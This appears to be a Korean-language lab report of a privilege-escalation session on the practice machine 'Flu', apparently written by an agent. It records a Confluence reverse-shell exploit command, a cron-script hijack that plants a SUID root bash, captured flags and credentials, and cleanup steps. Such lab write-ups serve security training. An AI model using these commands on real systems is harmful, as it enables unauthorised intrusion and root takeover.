# Flu — 권한상승 세션 (2026-08-20)

타겟 `192.168.248.41` · LHOST `192.168.45.207` · 소요 약 15분(재스캔 포함), 권한상승 구간만 5분

## 결과

**완료 2/2.**

| 플래그 | 값 | 경로 |
|---|---|---|
| `proof.txt` | `2caa37b3c096709c688b69556c3c6cf7` | `/root/proof.txt` |
| `local.txt` (이번 인스턴스) | `52791694c2a6ccde2db0f566f81d084f` | `/home/confluence/local.txt` |

⚠️ `local.txt` 값이 1차 세션 기록(`2d0c7239ce98c1add6986385f076c26e`)과 **다르다.** PG 는 리버트할 때마다 플래그를 재생성한다. 1차 값은 그 인스턴스에서 이미 제출돼 유효했고 포털은 여전히 그 한 칸을 인정한다. 지금 재제출할 필요는 없다.

두 플래그 모두 **대화형 셸에서 원위치 `cat`** 으로 읽었다. 웹셸을 경유하지 않았다.

## 경로

1. `through_the_wire.py --rhost 192.168.248.41 --rport 8090 --lhost 192.168.45.207 --protocol http:// --reverse-shell` → `confluence` 셸 (1차 세션과 동일, 즉시 성공)
2. 반사 열거 5종 — **전부 공백**
   - `id` → `groups=1001(confluence)` (lxd·docker·disk·sudo 전부 아님)
   - `sudo -n -l` → `sudo: a password is required`
   - SUID/SGID → 배포판 기본값만
   - `getcap -r /` → `ping`·`mtr-packet`·`gst-ptp-helper`
   - `/etc/cron*` → 기본값, `crontab -l` → `no crontab for confluence`
3. **`find / -writable`(제외 경로 다수) → `/opt/log-backup.sh`**
   `-rwxr-xr-x 1 confluence confluence`, 내용이 `BACKUP_DIR="/root/backup"` → root 로 실행된다는 뜻
4. 스크립트 끝에 `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash` 추가 (원본은 `/tmp/.lb.orig` 백업)
5. **48초 뒤** `-rwsr-xr-x 1 root root /tmp/rootbash` 생성
6. `/tmp/rootbash -p` → `euid=0`, `setresuid(0,0,0)` → `uid=0(root)`
7. root 로 확인한 실제 스케줄: `crontab -l` → `*/1 * * * * /opt/log-backup.sh`

## 왜 크론 열거가 빈손이었나

`/var/spool/cron/crontabs` 가 `drwx-wx--T root:crontab`, `root` 파일이 `0600`. **저권한 사용자는 다른 사용자의 개인 crontab 을 원리적으로 볼 수 없다.** `/etc/cron*` 이 비었다는 것은 "크론 없음"이 아니라 "관측 한계"다.

## 반증한 것

| 대상 | 초고/프롬프트의 서술 | 실측 |
|---|---|---|
| OS | "Ubuntu 22.04 계열"(SSH 배너 추정) | **Ubuntu 23.04, kernel 6.2.0-39-generic.** Launchpad 조회로 확인 — jammy=8.9p1-3ubuntu0.x, lunar=9.0p1-1ubuntu8.x. 배너 `1ubuntu8.5` 는 lunar 와 리비전까지 일치 |
| `/root/proof.txt` 를 못 읽은 이유 | "통상 `0600 root:root`" | 실제 모드는 **`-rw-r--r--`(0644)**. 막은 것은 `/root` 디렉터리의 `drwx------` — 경로 탐색이 안 된다 |
| `lxd` 그룹 후보 | "강도 낮음, `id` 로 판정" | **반증.** `groups=1001(confluence)` 뿐 |
| `confluence.cfg.xml` 위치 | `/opt/atlassian/confluence/confluence/WEB-INF/classes/` | 거기 없다. `/var/atlassian/application-data/confluence/` 와 `.../shared-home/` 두 곳 |
| 8091 (Aleph) | "Confluence 와 무관한 별개의 Clojure 서비스" [가정] | **Confluence 의 Synchrony**(협업 편집 백엔드). 같은 JRE·같은 설치 디렉터리·같은 `confluence` 계정. `ps` 인자가 `synchrony.core sql`. 권한상승 경로가 아니다 |
| JDK 버전 | "JDK 8 또는 11" [가정] | **11.0.14.1 Temurin** (Confluence 번들 JRE). Nashorn 존재 확정 |
| nmap OS 추정 | `Linux 5.0 - 5.14` | 실제 6.2. 포트 3개라 지문 표본 빈약 |

## 안 해본 것 (정직성)

- `HoldingOn12`(DB 비밀번호)를 OS 계정에 재사용 시도 — §4-4 가 먼저 답을 내서 하지 않았다
- Confluence admin 해시 `{PKCS5S2}MCB0MaBA39Gj...` 크랙
- 커널 익스플로잇(GameOver(lay) 등). 6.2.0-39 는 해당 패치(6.2.0-26) 이후라 대상이 아니라고 판단했으나 **실제로 시도하지 않았다**
- 8091 Synchrony 에 대한 능동 열거

## 획득 자격증명

- Confluence DB: `confluence` / `HoldingOn12` (MySQL, localhost 전용)
- Confluence 웹 admin 해시: `{PKCS5S2}MCB0MaBA39GjOQb3wG0ioM7w+pPdQXdy5GskVAtS5/Ef0fCnvr8jPMdZ2CDhM0ke` (미크랙)

## 정리 상태

**되돌림 확인:**
- `/opt/log-backup.sh` 원본 복원 (`tail -3` 으로 원본 마지막 줄 확인, md5 `8364444e3d54916cc38b8bea50ebc5e2`)
- `/tmp/rootbash` 삭제 확인 (`ls -la /tmp/` 에 없음)
- `/tmp/.lb.orig` 삭제 확인
- Kali tmux 세션 `flunmap` 종료 확인
- **타겟에 업로드한 파일 없음** — linpeas 포함 어떤 도구도 올리지 않았다

**의도적으로 남긴 것:**
- Kali tmux 세션 **`flushell`** — root 셸이 살아 있다. 총괄이 플래그를 재확인할 수 있도록 남겼다. 확인 후 `tmux kill-session -t flushell` 로 종료할 것
- 타겟의 리버스셸 프로세스 트리 (위 세션에 붙어 있음)

## Kali 산출물 (`~/PG/Flu/`)

| 파일 | 내용 |
|---|---|
| `nmap.log` | 1차 세션(2026-07-14) 원문 |
| `nmap_new.log` · `nmap_stdout.txt` | 2차 재스캔. **포트·버전 1차와 동일** |
| `privesc_session.log` | tmux 페인 전체 캡처 (604줄) — §4 의 모든 블록 출처 |
| `flag_evidence.txt` | 플래그 증거 한 화면 |
| `writeup_notes.txt` | 시간순 작업 기록 |
| `through_the_wire/` | 1차 세션 익스플로잇 클론 |

## 노트 변경 (`03. PG\Flu.md`)

900행 → 1270행.

- 프론트매터: `ip` → `192.168.248.41`, `tech/lin/cron` 추가, `tech_count` 3→4
- 상단 요약: 2/2, 경로 요약에 권한상승 추가. "1/2" 경고 콜아웃 제거, **"두 세션이 겹쳐 있다"** 안내로 교체
- §0: 크론 권한상승·크론 부분 관측 항목 추가
- §2-6: JDK [가정] → 실측(11.0.14.1)으로 승격
- §3-2: `lxd` 후보 반증 반영
- §4: **전면 신규.** 반사 명령 → SUID/포트/프로세스 → DB 자격증명 → `find / -writable` → 익스플로잇 → root 확인. 전부 실측 블록
- §5: 플래그 증거 블록 + `/root` 0700 vs `proof.txt` 0644 정정
- §6: ⑩(OS 오추정) ⑪(반사 5종이 빈손일 때 질문을 바꾼다) ⑫(크론 부분 관측) 추가. ⑦ 시간표를 2세션 대조로 재작성
- §7: 항목 13~19 추가
- §8: 권한상승 방어(파일 소유권) 절 추가
- 남긴 흔적: 확인한 것만 기재
